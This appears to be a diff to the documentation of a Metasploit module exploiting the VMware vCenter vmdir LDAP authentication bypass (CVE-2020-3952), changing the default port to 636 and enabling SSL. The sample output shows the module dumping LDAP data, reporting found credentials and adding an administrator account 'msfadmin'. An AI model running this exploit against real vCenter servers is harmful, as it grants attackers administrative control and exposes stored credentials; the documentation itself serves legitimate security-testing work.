@@ -51,8 +51,8 @@ Module options (auxiliary/admin/ldap/vmware_vcenter_vmdir_auth_bypass):
    BASE_DN                    no        LDAP base DN if you already have it
    PASSWORD                   no        Password of admin user to add
    RHOSTS                     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
-   RPORT     389              yes       The target port
-   SSL       false            no        Enable SSL on the LDAP connection
+   RPORT     636              yes       The target port
+   SSL       true             no        Enable SSL on the LDAP connection
    USERNAME                   no        Username of admin user to add
 
 
@@ -86,8 +86,8 @@ supportedldapversion: 3
 supportedsaslmechanisms: GSSAPI
 
 [+] Discovered base DN: dc=vsphere,dc=local
-[*] Dumping LDAP data from vmdir service at [redacted]:389
-[+] [redacted]:389 is vulnerable to CVE-2020-3952
+[*] Dumping LDAP data from vmdir service at [redacted]:636
+[+] [redacted]:636 is vulnerable to CVE-2020-3952
 [*] Storing LDAP data in loot
 [+] Saved LDAP data to /Users/wvu/.msf4/loot/20200417002255_default_[redacted]_VMwarevCenterS_975097.txt
 [*] Password and lockout policy:
@@ -107,7 +107,7 @@ vmwpasswordprohibitedpreviouscount: [redacted]
 
 [+] Credentials found: [redacted]
 [snip]
-[*] Bypassing LDAP auth in vmdir service at [redacted]:389
+[*] Bypassing LDAP auth in vmdir service at [redacted]:636
 [*] Adding admin user msfadmin with password msfadmin
 [+] Added user msfadmin, so auth bypass was successful!
 [+] Added user msfadmin to admin group
